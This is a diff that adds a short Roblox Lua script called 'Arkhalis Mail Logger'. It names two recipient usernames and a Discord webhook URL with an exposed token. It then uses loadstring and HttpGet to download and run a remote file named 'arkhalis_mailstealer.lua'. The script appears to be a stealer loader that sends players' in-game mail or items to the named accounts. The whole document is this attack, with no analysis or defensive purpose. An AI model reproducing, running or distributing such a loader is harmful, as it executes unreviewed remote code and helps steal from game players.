@@ -1,0 +1,11 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username1 = "phgamer_pogi13"
+_G.Username2 = "phgamer_pogi13"
+
+--[[ WebHook ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1117407084573638656/726TPtQW3cAcQMkn0f9sW4yUPWGyA9JseiFNKn4xZCzYewVKxOQy6r376c-Q_mPta-T4"
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
